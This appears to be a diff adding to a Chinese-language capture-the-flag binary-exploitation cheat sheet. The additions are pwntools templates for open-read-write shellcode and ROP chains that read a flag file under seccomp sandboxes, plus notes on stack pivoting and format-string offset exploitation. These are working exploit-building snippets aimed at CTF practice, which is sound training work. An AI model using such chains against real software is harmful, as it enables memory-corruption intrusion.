@@ -29,6 +29,26 @@ seccomp-tools dump ./<binary>        # 看是否 ORW 沙箱（禁了哪些 sysca
 ```
 如果禁了 `execve` → 需要用 ORW（open→read→write）链读 flag，不能用 system("/bin/sh")。
 
+**ORW 链速查**（pwntools 模板）：
+```python
+# shellcode 版（有执行权限时）
+sc  = shellcraft.pushstr('/flag')
+sc += shellcraft.open('rsp', 0)            # fd in rax
+sc += shellcraft.read('rax', 'rsp', 0x100)
+sc += shellcraft.write(1, 'rsp', 0x100)
+payload = asm(sc)
+
+# ROP 版（NX，用 libc gadget）
+rop = ROP(libc)
+flag_str = next(libc.search(b'/flag\x00'))
+bss_buf  = libc.bss(0x200)
+rop.open(flag_str, 0); rop.read(3, bss_buf, 0x100); rop.write(1, bss_buf, 0x100)
+
+# 禁 open 时用 openat（syscall 257）
+rop.openat(-100, flag_str, 0)   # AT_FDCWD=-100
+# 连 openat 也禁 → /proc/self/maps 找 flag 映射 / sendfile(40) / 布尔侧信道
+```
+
 ### 步骤 4：构造原语
 把漏洞升级为 **任意读 / 任意写 / 地址泄漏**：
 - 堆：tcache poisoning / large_bin_attack / unsorted bin 泄漏
@@ -122,6 +142,8 @@ patchelf --set-interpreter <ld_path> --set-rpath <libc_dir> <binary>
 | userfaultfd 被禁 | FUSE 阻塞 / MADV_DONTNEED+并发 mprotect / io_uring stall / fallocate |
 | 利用链崩在 CFI/PAC | 改用非函数指针落点：modprobe_path / Dirty PageTable / 任意文件写 |
 | 远程超时 | 用 `context.log_level='debug'` 检查交互时序；pwntools `p.recvuntil` 而非 `sleep` |
+| **栈迁移**（溢出空间小，ROP 链放不下） | 方法 A `leave;ret`：覆写 saved rbp = `chain_addr-8`、ret = `leave;ret` gadget → sp 迁到 chain。方法 B `xchg rsp,rax;ret`（rax 持堆/bss 指针）。方法 C `pop rsp;ret`。ARM64：找 `mov sp,x29` 控 x29 |
+| **格式化字符串偏移定位** | x86-64：`%1`~`%5` 读 rsi/rdx/rcx/r8/r9，`%6` 起读栈。发 `AAAAAAAA %6$p` 数到 `0x4141414141414141`。一键构造：`fmtstr_payload(offset, {addr: val}, write_size='byte')`。ARM64：`%1`~`%8` 读 x0-x7，`%9` 起读栈 |
 
 ## §5 工具链
 
